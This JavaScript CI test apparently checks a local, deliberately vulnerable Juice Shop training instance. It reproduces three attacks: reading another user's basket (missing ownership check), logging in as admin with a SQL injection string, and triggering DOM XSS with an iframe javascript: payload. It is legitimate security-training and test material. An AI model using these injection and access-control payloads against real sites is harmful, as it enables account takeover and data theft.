// Runs only against the dedicated, disposable CI container on loopback.
import assert from "node:assert/strict";
import { mkdir, writeFile } from "node:fs/promises";
import { chromium } from "@playwright/test";

if (
  process.env.KAIRON_JUICE_CI !== "1" ||
  process.env.GITHUB_ACTIONS !== "true"
)
  throw new Error(
    "This fixture is restricted to the disposable GitHub Actions training container",
  );

const origin = "http://127.0.0.1:3001";
const report = { version: "20.3.0", origin, accounts: 0, observations: [] };
async function request(path, body, token) {
  const response = await fetch(origin + path, {
    method: body === undefined ? "GET" : "POST",
    headers: {
      "Content-Type": "application/json",
      ...(token ? { Authorization: "Bearer " + token } : {}),
    },
    ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    signal: AbortSignal.timeout(10000),
  });
  return { response, body: await response.json() };
}
let ready = false;
for (let attempt = 0; attempt < 45; attempt++) {
  try {
    const { body } = await request("/rest/admin/application-version");
    if (body.version === report.version) {
      ready = true;
      break;
    }
  } catch {
    /* Container startup is asynchronous. */
  }
  await new Promise((resolve) => setTimeout(resolve, 1000));
}
assert.ok(ready, "Pinned Juice Shop must start with the expected version");
const password = "Training-only-28!";
const users = [];
for (const name of ["alice", "boris"]) {
  const email = `${name}@kairon.invalid`;
  const created = await request("/api/Users/", {
    email,
    password,
    passwordRepeat: password,
    securityQuestion: { id: 1 },
    securityAnswer: "training-only",
  });
  assert.equal(created.response.status, 201);
  const login = await request("/rest/user/login", { email, password });
  assert.equal(login.response.status, 200);
  assert.ok(login.body.authentication.token);
  users.push(login.body.authentication);
  report.accounts++;
}
assert.notEqual(users[0].bid, users[1].bid);
const own = await request(
  "/rest/basket/" + users[0].bid,
  undefined,
  users[0].token,
);
assert.equal(own.response.status, 200);
const foreign = await request(
  "/rest/basket/" + users[1].bid,
  undefined,
  users[0].token,
);
assert.equal(
  foreign.response.status,
  200,
  "Intentionally missing ownership check is reproducible",
);
assert.equal(foreign.body.data.id, users[1].bid);
report.observations.push(
  "two owned test accounts reproduce the missing basket ownership check",
);
const injected = await request("/rest/user/login", {
  email: "' OR true--",
  password: "training-only",
});
assert.equal(injected.response.status, 200);
assert.ok(injected.body.authentication.token);
assert.equal(injected.body.authentication.umail, "admin@juice-sh.op");
report.observations.push(
  "local SQL login example returns an authenticated training session",
);

await mkdir("test-results", { recursive: true });
const browser = await chromium.launch({
  channel: process.env.PLAYWRIGHT_CHANNEL || "chrome",
  args: ["--no-sandbox"],
});
try {
  const page = await browser.newPage({
    viewport: { width: 1366, height: 900 },
  });
  // v20.3.0 stores dismissal in cookies, not localStorage. Use its actual UI.
  await page.goto(origin + "/#/search");
  await page
    .getByRole("button", { name: "Close Welcome Banner", exact: true })
    .click();
  await page.locator(".cc-dismiss").click();
  await page.getByRole("button", { name: "Open search", exact: true }).click();
  const search = page.locator("#searchQuery input");
  await search.waitFor();
  let alertSeen = false;
  page.on("dialog", async (dialog) => {
    assert.equal(dialog.message(), "xss");
    alertSeen = true;
    await dialog.accept();
  });
  await search.fill('<iframe src="javascript:alert(`xss`)">');
  await search.press("Enter");
  for (let i = 0; i < 30 && !alertSeen; i++) await page.waitForTimeout(200);
  assert.ok(alertSeen, "Harmless local XSS alert must be visible");
  // Challenge state belongs to this disposable shop, not to an individual user.
  // Socket-triggered verification saves asynchronously; wait for persisted rows.
  const expectedChallenges = [
    ["localXssChallenge", "DOM XSS"],
    ["loginAdminChallenge", "Login Admin"],
    ["basketAccessChallenge", "View Basket"],
  ];
  let byKey;
  for (let attempt = 0; attempt < 50; attempt++) {
    const challenges = await request("/api/Challenges");
    assert.equal(challenges.response.status, 200);
    byKey = new Map(
      challenges.body.data.map((challenge) => [challenge.key, challenge]),
    );
    if (expectedChallenges.every(([key]) => byKey.get(key)?.solved === true))
      break;
    await page.waitForTimeout(200);
  }
  for (const [key, name] of expectedChallenges) {
    assert.equal(byKey.get(key)?.name, name);
    assert.equal(byKey.get(key)?.solved, true, `${name} must be persisted`);
  }
  const allChallenges = [...byKey.values()];
  assert.equal(allChallenges.length, 116);
  const codingExercises = allChallenges.filter(
    (challenge) => challenge.hasCodingChallenge,
  ).length;
  assert.equal(codingExercises, 35);
  report.challengeCounts = {
    hacking: allChallenges.length,
    codingExercises,
    codingStages: codingExercises * 2,
    total: allChallenges.length + codingExercises * 2,
  };
  await page.goto(origin + "/#/score-board");
  await page
    .locator("challenge-card .name")
    .filter({ hasText: /^Score Board$/ })
    .waitFor();
  await page.screenshot({
    path: "test-results/public-juice-shop-local.png",
    fullPage: false,
  });
  report.observations.push(
    "browser displays harmless local XSS alert and solved challenge flags",
  );
} finally {
  await browser.close();
}
await writeFile(
  "test-results/juice-shop-verification.json",
  JSON.stringify(report, null, 2) + "\n",
);
console.log(JSON.stringify(report));
